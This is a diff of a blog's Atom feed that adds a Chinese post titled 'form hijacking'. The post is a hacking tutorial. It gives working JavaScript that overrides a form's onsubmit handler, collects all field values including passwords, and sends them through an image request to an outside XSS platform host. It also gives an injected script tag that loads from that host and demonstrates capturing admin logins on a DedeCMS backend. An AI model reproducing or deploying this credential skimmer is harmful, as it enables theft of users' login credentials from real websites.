@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2015-04-28T14:57:00.483Z</updated>
+  <updated>2015-04-29T03:19:45.967Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -13,6 +13,77 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[表单劫持]]></title>
+    <link href="http://yoursite.com/2015/04/29/%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81/"/>
+    <id>http://yoursite.com/2015/04/29/表单劫持/</id>
+    <published>2015-04-29T02:22:11.000Z</published>
+    <updated>2015-04-29T03:19:45.967Z</updated>
+    <content type="html"><![CDATA[<pre><code>今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是<span class="string">http:</span><span class="comment">//xss.hacktask.net/ </span>
+</code></pre><blockquote>
+<p>在网上找了一下表单劫持方面的资料,思路<font color="red">大多是配合xss.js公共模块,通过修改form表单里action的地址为自己的Form.php中,通过解析$_POST的内容达到劫持表单的功能.</font>有兴趣的朋友自己搜索下,这里主要介绍使用Javascript进行表单劫持,这种方法的<font color="blue">缺点会在后面给出.</font></p>
+</blockquote>
+<h1 id="思路">思路</h1><blockquote>
+<p>大家都知道,在提交form表单时会调用onsubmit方法,既然调用了onsubmit,说明表单中该填的项肯定都已经填好了,这时,我们通过修改onsubmit方法,便可以获取表单中的信息,代码如下:</p>
+</blockquote>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var <span class="keyword">str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;f.elements.length;i++) <span class="comment">//逐个获取表单的名称以及值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">str</span>+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>; <span class="comment">//'||'为分隔符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">str</span>=<span class="keyword">str</span>.substr(<span class="number">0</span>,<span class="keyword">str</span>.length-<span class="number">2</span>);</span><br><span class="line">var img=<span class="keyword">new</span> Image(); <span class="comment">//使用Image提交信息</span></span><br><span class="line">img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+escape(<span class="keyword">str</span>)+<span class="string">'&amp;url='</span>+escape(location.href); <span class="comment">//&#123;projectId&#125;为XSS平台为你分配的id</span></span><br><span class="line">func(event); <span class="comment">//func保存之前的onsubmit方法,由于这里面可能需要执行类似编码等操作,所以这里不能直接跳过</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>
+<h1 id="模块配置">模块配置</h1><ul>
+<li>首先在XSS平台中创建一个新的模块,模块名称和描述自己填吧,需要配置的是参数,配置参数,以及代码<center><br>  <img src="/img/blog_img/4月/表单劫持/1.png"><br></center>
+
+</li>
+</ul>
+<blockquote>
+<p>在底下的代码框写入我们的代码,就OK了</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.forms[<span class="string">'&#123;set.formname&#125;'</span>];</span><br><span class="line"><span class="keyword">if</span>(f==<span class="literal">undefined</span>)</span><br><span class="line">&#123;</span><br><span class="line">        f=<span class="built_in">document</span>.getElementById(<span class="string">'&#123;set.formid&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func=f.onsubmit;</span><br><span class="line">f.onsubmit=<span class="function"><span class="keyword">function</span><span class="params">(event)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str=<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;f.elements.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		str+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	str=str.substr(<span class="number">0</span>,str.length-<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+<span class="built_in">escape</span>(str)+<span class="string">'&amp;url='</span>+<span class="built_in">escape</span>(location.href);</span><br><span class="line">	func(event);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>点击配置，完成</p>
+</blockquote>
+<h1 id="演示">演示</h1><blockquote>
+<p>这里以织梦为例,在后台那查看代码</p>
+</blockquote>
+<center><br>    <img src="/img/blog_img/4月/表单劫持/2.png"><br></center>
+
+<blockquote>
+<p>然后在XSS中新建一个项目,项目名称,描述,惯例随便写,选中我们自建的模块,formname写成form1,保存.<br>复制XSS代码(如果不知道怎么做的话自行百度XSS平台使用),我这里是</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xss.hacktask.net</span>/<span class="attribute">9D1Q9Z</span>?<span class="attribute">1430276699</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>织梦平台上模拟XSS插入</p>
+<center><br>    <img src="/img/blog_img/4月/表单劫持/3.png"><br></center>
+
+<blockquote>
+<p>这里操作就完成了,返回登录界面,随便登录一下</p>
+<p>熟悉的界面</p>
+</blockquote>
+<center><br>    <img src="/img/blog_img/4月/表单劫持/4.png"><br></center>
+
+<p>在XSS平台上看一下</p>
+<center><br>    <img src="/img/blog_img/4月/表单劫持/5.png"><br></center>
+
+<blockquote>
+<p>截获到了吧,看下内容</p>
+</blockquote>
+<center><br>    <img src="/img/blog_img/4月/表单劫持/6.png"><br></center>
+
+<h1 id="缺点">缺点</h1><blockquote>
+<p>看到这里,缺点大家应该也知道了,在输入的时候不管你的用户名密码是否正确,都会上传到XSS平台,也就是说,你截获到的账号密码不一定是正确的</p>
+</blockquote>
+<font size="30" color="green">祝大家好运^-^</font>]]></content>
+    <summary type="html">
+    <![CDATA[<pre><code>今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是<span class="string">http:</span><span class="comment">//xss.hacktask.net/ </span>
+</code><]]>
+    </summary>
+    
+      <category term="hack" scheme="http://yoursite.com/tags/hack/"/>
+    
+      <category term="js" scheme="http://yoursite.com/tags/js/"/>
+    
+      <category term="表单劫持" scheme="http://yoursite.com/tags/%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81/"/>
+    
+      <category term="hack" scheme="http://yoursite.com/categories/hack/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[windows下hexo-github无域名安装]]></title>
